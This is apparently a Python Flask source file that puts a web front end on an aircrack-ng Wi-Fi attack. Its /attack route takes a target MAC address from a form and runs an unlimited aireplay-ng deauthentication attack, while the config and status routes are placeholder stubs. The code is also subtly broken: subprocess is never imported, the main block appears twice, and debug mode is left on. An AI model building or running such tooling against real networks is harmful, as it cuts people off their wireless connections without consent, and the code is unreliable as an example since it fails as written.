from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/config', methods=['GET', 'POST'])
def config():
    if request.method == 'POST':
        mode = request.form.get('mode')
        # Logic to switch wireless adapter mode using aircrack suite
        # Capture the output and pass it to the template
        result = f"Wireless adapter mode set to: {mode}"
        return render_template('config.html', result=result)
    return render_template('config.html')

@app.route('/status')
def status():
    # Logic to retrieve the current status of the wireless adapter
    # Capture the output and pass it to the template
    adapter_status = "Monitor mode"
    return render_template('status.html', adapter_status=adapter_status)

@app.route('/attack', methods=['GET', 'POST'])
def attack():
    if request.method == 'POST':
        target_mac = request.form.get('mac')
        interface = 'wlan0'  # Replace 'wlan0' with your wireless adapter name

        # Execute the deauthentication attack command
        command = ['aireplay-ng', '--deauth', '0', '-a', target_mac, interface]

        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, universal_newlines=True)
            result = "Deauthentication attack completed"
        except subprocess.CalledProcessError as e:
            output = e.output
            result = "Failed to execute deauthentication attack"

        return render_template('attack.html', result=result, output=output)

    return render_template('attack.html')

if __name__ == '__main__':
    app.run(debug=True)

if __name__ == '__main__':
    app.run(debug=True)
